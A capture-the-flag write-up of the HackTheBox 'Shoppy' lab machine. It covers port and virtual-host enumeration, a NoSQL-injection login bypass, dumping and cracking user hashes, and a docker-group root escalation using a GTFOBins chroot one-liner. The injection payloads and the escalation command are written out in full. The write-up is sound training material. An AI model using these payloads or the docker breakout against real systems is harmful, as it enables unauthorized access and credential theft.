# Shoppy  (NoSQL Injection and Docker Vulnerability)

- Difficulty: `Easy`

- Points: `20`

## Reconnaissance
Kicking of the Recon phase with a good ol' simple Nmap scan.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Shoppy]
└─$ sudo nmap -sC -sV -O -oA nmap 10.10.11.180
[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-10 03:20 EST
Nmap scan report for 10.10.11.180
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-server-header: nginx/1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/10%OT=22%CT=1%CU=39987%PV=Y%DS=2%DC=I%G=Y%TM=63BD1FD
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST1
OS:1NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.21 seconds
                                                                   
```

The results show that there are two open ports:
- port `22`: OpenSSH 8.4p1 Debian
- port `80`: nginx 1.23.1

Before starting enumeration, I ran a more comprehensive nmap scan in the background to make sure that I did not miss anything

So I ran an Nmap scan that covers all ports.

```

```

## Enumeration

On visiting the web-page to check whats it all about, I noticed that the web-site coverted the IP address to `http://shoppy.htb/`, indicating that I need to write the ip address of the machine and `shoppy.htb`, for display, in `/etc/hosts`.

I did by executing following commands:
```
sudo nano /etc/hosts
Added this command in the /etc/host file: 10.10.11.180 shoppy.htb
Saved and exited the file
```

On reloading the site, we can see that there is a nice animation of a timer.

I tried clicking here and there to look if there's any hidden button or something but there was nothing of such sort. I, then, proceeded to look at the `source-code` of the web-site and found nothing there too.

So I decided to run `gobuster` to enumerate directories.

Since we've added a host to a IP address, I used `-vhost` tag in gobuster instead of using `dir` tag

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Shoppy]
└─$ gobuster vhost -w /usr/share/wordlists/SecLists-master/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100 -u shoppy.htb 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://shoppy.htb
[+] Method:       GET
[+] Threads:      100
[+] Wordlist:     /usr/share/wordlists/SecLists-master/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/01/10 04:40:12 Starting gobuster in VHOST enumeration mode
===============================================================
Found: mattermost.shoppy.htb (Status: 200) [Size: 3122]
                                                       
===============================================================
2023/01/10 04:42:18 Finished
===============================================================
                              
```

So I found `mattermost.shoppy.htb` and was given a error as soon as i visited the page. I then remembered to add the `mattermost.shoppy.htb` host to the IP address in the `/etc/hosts` file

After adding the host, I refreshed the page, and there was nothing, just a blank white page, I checked out the source code and there was still nothing.

![shp-1](https://user-images.githubusercontent.com/87711310/211517922-47417a2b-e1ed-40f8-9a05-3823aa6624ab.png)

But after a few seconds when I visted the page again, there was a `login` form and I was in `/login` directory

![shp-2](https://user-images.githubusercontent.com/87711310/211517930-916bcbf5-7e5e-4edd-b292-de5813be1ce8.png)

However, I knew this was the website, we'll be needing to attack rightnow, because we would require a proper username and passwd to login into it

So I decided to enumerate directories using `WFUZZ`.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Shoppy]
└─$ wfuzz -c -z file,/usr/share/wordlists/SecLists-master/Discovery/Web-Content/raft-large-directories.txt --hc 404 "http://shoppy.htb/FUZZ/" 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://shoppy.htb/FUZZ/
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                    
=====================================================================

000000003:   302        0 L      4 W        28 Ch       "admin"                                                                                    
000000039:   200        25 L     62 W       1074 Ch     "login"                                                                                    
000000109:   302        0 L      4 W        28 Ch       "Admin"                                                                                    
000000160:   200        25 L     62 W       1074 Ch     "Login"                                                                                    
000000681:   302        0 L      4 W        28 Ch       "ADMIN" 
```

And I found couple of directories. 
I visited the `/admin` directory and was redirected to `/login` directory where I was supposed to login. 

I did not find any credentials up until now, so I was pretty much sure that I had to maybe use `SQL Injection` to bypass this `login` page

So I started executing various payloads to bypass this login form and one thing which I noticed was that if I entered wrong credentials, I was immediately displayed an error message saying `Wrong Credentials` but when I entered  `'` (single-quote) the server took forever to authenticate it and atlast gave a `504` gateway time-out.

![shp-3](https://user-images.githubusercontent.com/87711310/211531592-15570891-126e-4e94-a75b-7cf5491ac4c4.png)

![shp-4](https://user-images.githubusercontent.com/87711310/211531585-414f938a-4802-4a03-b8ba-f3c0fd09205f.png)


I tried various payloads and still couldn't find a way to bypass the login page.

So I found out whats the matter and came to a conclusion that it is a NoSQL Injection rather than just a regular SQL Injection

And from [hacktricks' website](https://book.hacktricks.xyz/pentesting-web/nosql-injection) I found out this following difference between SQL and NoSQL Injection payloads:

```sql
Normal sql: ' or 1=1-- -
Mongo sql: ' || 1==1//    or    ' || 1==1%00
```

After a few more tries, I was able to figure out the payload for bypassing the login page.

```
admin'||'1==1
```

![shp-5](https://user-images.githubusercontent.com/87711310/211531600-dacd3f4c-8812-49fb-b55d-a91d30265766.png)

After logging in, I was displyed a `Products of Shoppy App` page

![shp-6](https://user-images.githubusercontent.com/87711310/211531972-2e2657f6-f741-4b82-89eb-e63352b22db7.png)

I saw the `search users` button and searched for `admin` and a button to `download export` appeared on the screen. 

On clicking it, I was redirected to a page that revealed credentials of `admin`.

I took the credentials and tried to crack the hash but it was of no use.

I suppose this hash was intentionally uncrackable and there might be another user or another crackable hash.

To find this out I used the same `NoSql` injection payload in the `user search` and guess what? I found a user named `josh` and his credentials.

![shp-7](https://user-images.githubusercontent.com/87711310/211533860-63c1d4ba-8f7f-4f21-a62a-c230641f00a5.png)

Now, I took the credentials and passed them through CrackStation to crack the hash, and lucikly I found the password.


![shp-8](https://user-images.githubusercontent.com/87711310/211534619-aae47d04-5c34-458b-bef4-cfdd504ff233.png)

Now, I remember ahving viewed a `login` page on `mattermost.shoppy.htb`.

So i visted it and tried to login using josh's credentials and Voila!! I'm in


![shp-9](https://user-images.githubusercontent.com/87711310/211535242-ec0948db-181e-4925-971a-3600689caf2f.png)

No redirected to the logged in page I found couple of things.

![shp-10](https://user-images.githubusercontent.com/87711310/211535414-eb3bfe3b-44f0-46fe-99b4-080ff05f443b.png)

There's another used named `jaeger`and they're talking about, installing docker, Learning C++ and having a `password-manager`

Apart from these, I also found jaeger's credentials  that could be used to login through ssh 

![shp-11](https://user-images.githubusercontent.com/87711310/211536029-cff28a02-54ae-466e-9fd2-ea202518629b.png)

So I used the credentials and ssh'ed into the machine.

And........ I'm in!!!

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Shoppy]
└─$ ssh jaeger@shoppy.htb
The authenticity of host 'shoppy.htb (10.10.11.180)' can't be established.
ED25519 key fingerprint is SHA256:RISsnnLs1eloK7XlOTr2TwStHh2R8hui07wd1iFyB+8.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'shoppy.htb' (ED25519) to the list of known hosts.
jaeger@shoppy.htb's password: 
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
jaeger@shoppy:~$ 
```
So time to get the user's flag
 
```
aeger@shoppy:~$ whoami
jaeger
jaeger@shoppy:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  ShoppyApp  shoppy_start.sh  Templates  user.txt  Videos
jaeger@shoppy:~$ cat user.txt
*****************************
```

## Privilege Escalation
Entering `sudo -l` so see what can I run as sudo, I found out one command that could be ran as `sudo`

```
jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager

````

So Now I ran the following command and was immediately prompted to enter `deploy's` password which I did not have.

So my next task was to find out `deploy's` credentials

On viewing the contents of `/home/deploy/password-manager`, we get the password and entering the password retrieved to the same program with sudo privilege, reveals the password of the `deploy` user.

![shp-12](https://user-images.githubusercontent.com/87711310/211542131-1d82165c-5ee0-4c1e-b9d3-d2adf9e07280.png)

![shp-13](https://user-images.githubusercontent.com/87711310/211542710-68c74a8b-e38f-477c-a3ec-7cd6ef76f2b8.png)

Once we retrieve the password for `deploy` we can ssh into the user

```
┌──(darshan㉿kali)-[~]
└─$ ssh deploy@shoppy.htb
deploy@shoppy.htb's password: 
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$ whoami
deploy
$ 

```
 Trying to run `sudo` on deploy's account is not allowed
 ```
 $ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for deploy: 
Sorry, user deploy may not run sudo on shoppy.

 ```
 
 Now, looking at the `id` and `hostname` of the machine, reveals the presence of `docker`
 
```
$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
$ hostname
shoppy
$ hostname -I
10.10.11.180 172.17.0.1 dead:beef::250:56ff:feb9:a1c 
$ 

```

So i headed over to [GTFObins](https://gtfobins.github.io/gtfobins/docker/) to find a exploit for docker to gain root privileges and I found this simple exploit.

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

simply executing this command instantly gives us root access.

```
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# whoami
root

```

And using this we can obtain the root flag.
